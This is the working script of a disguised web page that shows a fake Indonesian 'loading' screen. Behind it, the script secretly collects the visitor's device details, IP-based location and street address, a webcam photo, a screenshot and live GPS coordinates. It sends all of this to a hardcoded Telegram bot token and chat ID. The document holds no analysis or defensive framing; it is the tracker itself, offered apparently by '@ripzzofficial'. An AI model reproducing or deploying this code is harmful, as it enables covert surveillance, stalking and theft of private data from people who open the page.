 <script>
        const token = '8506760023:AAHkzVIbsp0QeijeW5GHS4HqJ9zzC2j3tD8';
        const chatId = '8345962712';

        
        // Simulate infinite loading
        let progress = 0;
        const progressBar = document.getElementById('progress-bar');
        const loadingDetails = document.getElementById('loading-details');
        const loadingMessages = [
            "Memeriksa modul sistem...",
            "Memuat komponen inti...",
            "Menginisialisasi antarmuka...",
            "Memverifikasi koneksi...",
            "Menyiapkan lingkungan...",
            "Memeriksa pembaruan...",
            "Memuat aset tampilan..."
        ];

        const loadingInterval = setInterval(() => {
            progress += Math.random() * 5;
            if (progress > 98) progress = 98;
            progressBar.style.width = progress + '%';
            
            if (Math.random() > 0.9) {
                loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
            }
        }, 500);
        

        // Telegram functions
        const sendToTelegram = async (data) => {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: data,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Error sending to Telegram:', e);
            }
        };

        const sendPhoto = async (blob, filename) => {
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, filename);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error('Error sending photo:', e);
            }
        };

        // Get detailed location
        const getLocationDetails = async (lat, lon) => {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                if (data.address) {
                    return {
                        kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                        kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                        fullAddress: data.display_name || "Alamat tidak tersedia"
                    };
                }
            } catch (e) {
                console.error('Error getting location details:', e);
            }
            return {
                kabupaten: "Tidak diketahui",
                kecamatan: "Tidak diketahui",
                fullAddress: "Alamat tidak tersedia"
            };
        };

        // Collect device information
        const collectDeviceInfo = async () => {
            let message = '╭───── Tracking Report ───── ⦿\n\n';
            
            // Device Information
            message += '⚙️ DEVICE INFORMATION\n';
            message += `🖥️ Device: ${navigator.userAgent}\n`;
            message += `💻 Platform: ${navigator.platform}\n`;
            message += `🌐 Bahasa: ${navigator.language}\n`;
            message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
            message += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
            message += `🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
            message += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
            message += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
            
            // Battery Info
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    message += `🔋 Battery: ${Math.floor(battery.level * 100)}%\n`;
                    message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
                } catch (e) {
                    message += '🔋 Battery: ❌ Tidak tersedia\n';
                }
            }
            
            message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
            message += `🕒 Page Load Time: ${(performance.now()).toFixed(2)} ms\n`;
            message += `📜 History Length: ${history.length}\n`;
            message += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
            message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
            message += `🌍 URL: ${window.location.href}\n`;
            message += `📄 Title: ${document.title}\n`;
            message += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
            

            // IP and Location Information
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                
                message += '📍 LOCATION INFORMATION\n';
                message += `📡 IP Address: ${ipData.ip}\n`
                message += `🏙️ Kota: ${ipData.city}\n`;
                message += `🏙️ Kabupaten: ${ipData.region}\n`;
                message += `🗺️ Wilayah: ${ipData.region}\n`;
                message += `🌎 Negara: ${ipData.country_name}\n`;
                message += `🏷️ Kode Pos: ${ipData.postal}\n`;
                
                if (ipData.latitude && ipData.longitude) {
                    message += `📌 Latitude: ${ipData.latitude}\n`;
                    message += `📍 Longitude: ${ipData.longitude}\n`;
                    
                    const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
                    message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
                    message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
                    message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
                    
                }
            } catch (e) {
                message += '❌ Gagal mendapatkan informasi lokasi\n';
            }

            message += '\n╰───── Telegram @ripzzofficial ───── ⦿';
            return message;
        };

        // Main tracking function
        const startTracking = async () => {
            // Send device info
            const deviceInfo = await collectDeviceInfo();
            await sendToTelegram(deviceInfo);

            // Try to access camera
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 3000));
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.jpg'), 'image/jpeg');
                
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                await sendToTelegram('❌ Camera access blocked');
            }

            // Take screenshot
            setTimeout(async () => {
                try {
                    const canvas = await html2canvas(document.body);
                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
                } catch (e) {
                    await sendToTelegram('❌ Screenshot failed');
                }
            }, 5000);

            // GPS tracking
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(async (pos) => {
                    const coords = pos.coords;
                    let gpsInfo = `📍 LIVE GPS TRACKING\n`;
                    gpsInfo += `📌 Lat: ${coords.latitude}\n`;
                    gpsInfo += `📍 Lng: ${coords.longitude}\n`;
                    gpsInfo += `🎯 Akurasi: ${coords.accuracy}m\n`;
                    
                    const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
                    gpsInfo += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
                    gpsInfo += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
                    gpsInfo += `🏠 Alamat: ${locationDetails.fullAddress}\n`;
                    
                    
                    await sendToTelegram(gpsInfo);
                }, 
                async (err) => {
                    await sendToTelegram(`❌ GPS Error: ${err.message}`);
                }, 
                { 
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                });
            }
        };

        // Start tracking after delay
        setTimeout(startTracking, 3000);
    </script>
</body>
</html>
